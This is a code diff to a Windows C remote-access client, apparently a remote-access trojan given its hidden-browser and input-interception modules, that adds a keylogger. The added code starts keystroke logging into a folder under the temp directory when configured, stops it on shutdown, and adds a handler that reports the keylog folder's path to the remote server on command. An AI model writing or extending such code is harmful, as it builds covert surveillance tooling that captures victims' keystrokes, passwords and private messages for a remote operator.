@@ -12,6 +12,7 @@
 #include "remote_desktop.h"
 #include "remote_input_interception.h"
 #include "remote_hidden_browser.h"
+#include "remote_keylogger.h"
 #include <ShlObj.h>
 #include <Shellapi.h>
 #include <PowrProf.h>
@@ -90,9 +91,27 @@ void remote_client_run(void) {
     }
     remote_log("config loaded: %s:%u", config.server_address, (unsigned)config.server_port);
 
+    if (config.keylogging) {
+        char logs_dir[MAX_PATH];
+        DWORD n = GetTempPathA((DWORD)sizeof(logs_dir), logs_dir);
+        if (n > 0 && n < (DWORD)sizeof(logs_dir)) {
+            size_t len = strlen(logs_dir);
+            if (len > 0 && logs_dir[len - 1] == '\\') logs_dir[len - 1] = '\0';
+            _snprintf_s(logs_dir, sizeof(logs_dir), _TRUNCATE, "%s\\Keylogger", logs_dir);
+        } else {
+            strcpy_s(logs_dir, sizeof(logs_dir), "C:\\Keylogger");
+        }
+        if (remote_keylogger_start(logs_dir))
+            remote_log("[keylogger] started, dir=%s", logs_dir);
+        else
+            remote_log("[keylogger] start failed");
+    }
+
     for (;;) {
-        if (InterlockedCompareExchange(&g_client_stop, 1, 1) == 1)
+        if (InterlockedCompareExchange(&g_client_stop, 1, 1) == 1) {
+            remote_keylogger_stop();
             break;
+        }
 
         remote_log("connecting to %s:%u ...", config.server_address, (unsigned)config.server_port);
         remote_transport_handle_t transport = remote_transport_connect(config.server_address, config.server_port);
@@ -527,6 +546,35 @@ void remote_client_run(void) {
                                     remote_log("[loop] GetDrivesResponse prepend_imessage failed");
                             } else
                                 remote_log("[loop] GetDrivesResponse encode failed (no drives?)");
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_GetKeyloggerLogsDirectory) {
+                        remote_log("[loop] handling GetKeyloggerLogsDirectory");
+                        {
+                            char logs_dir[MAX_PATH];
+                            DWORD n = GetTempPathA((DWORD)sizeof(logs_dir), logs_dir);
+                            if (n > 0 && n < (DWORD)sizeof(logs_dir)) {
+                                size_t len = strlen(logs_dir);
+                                if (len > 0 && logs_dir[len - 1] == '\\') logs_dir[len - 1] = '\0';
+                                _snprintf_s(logs_dir, sizeof(logs_dir), _TRUNCATE, "%s\\Keylogger", logs_dir);
+                            } else {
+                                strcpy_s(logs_dir, sizeof(logs_dir), "C:\\Keylogger");
+                            }
+                            CreateDirectoryA(logs_dir, NULL);
+                            unsigned char resp_body[512];
+                            unsigned int resp_len = remote_proto_encode_get_keylogger_logs_directory_response(logs_dir, resp_body, sizeof(resp_body));
+                            if (resp_len > 0) {
+                                unsigned char full_msg[520];
+                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
+                                    REMOTE_SUBTYPE_GetKeyloggerLogsDirectoryResponse, resp_body, resp_len);
+                                if (full_len > 0) {
+                                    unsigned char frame[524];
+                                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
+                                    remote_log("[loop] GetKeyloggerLogsDirectoryResponse sent: path=%s, send %s", logs_dir, sent ? "OK" : "FAIL");
+                                }
+                            } else
+                                remote_log("[loop] GetKeyloggerLogsDirectoryResponse encode failed");
                         }
                     }
                     else if (subtype == REMOTE_SUBTYPE_DoProcessEnd) {
